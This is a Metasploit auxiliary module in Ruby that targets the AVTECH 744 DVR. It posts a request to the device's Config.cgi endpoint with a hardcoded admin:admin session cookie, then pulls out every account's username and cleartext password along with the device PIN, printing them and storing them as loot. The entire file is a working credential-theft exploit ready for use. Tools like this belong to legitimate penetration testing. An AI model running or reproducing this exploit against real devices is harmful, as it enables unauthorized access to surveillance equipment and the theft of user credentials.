require 'msf/core'

    class Metasploit3 < Msf::Auxiliary

        include Msf::Exploit::Remote::HttpClient

        def initialize(info = {})
            super(update_info(info,
                'Name'           => 'AVTECH 744 DVR Account Information Retrieval',
                'Description'    => %q{
                    This module will extract the account information from the DVR,
                    including all user's usernames and cleartext passwords plus
                    the device PIN, along with a few other miscellaneous details.
                },
                'Author'         => [ 'nstarke' ],
                'License'        => MSF_LICENSE
            ))

            register_options(
                [
                    Opt::RPORT(80),
                ], self.class)
        end


        def run
            res = send_request_cgi({
               'method' => 'POST',
               'uri' => '/cgi-bin/user/Config.cgi',
               'cookie' => 'SSID=YWRtaW46YWRtaW4=;',
               'vars_post' => {
                    'action' => 'get',
                    'category' => 'Account.*'
                }
            })

            if (res != nil)
                res.body.each_line { |line|
                    split = line.split('=')
                    key = split[0]
                    value = split[1]
                    if (key && value)
                        print_good("#{key} - #{value}")
                    end
                }
                p = store_loot('avtech744.dvr.accounts', 'text/plain', rhost, res.body)
                print_good("avtech744.dvr.accounts stored in #{p}")
            else
                print_error("Unable to receive a response")
            end
        end
    end
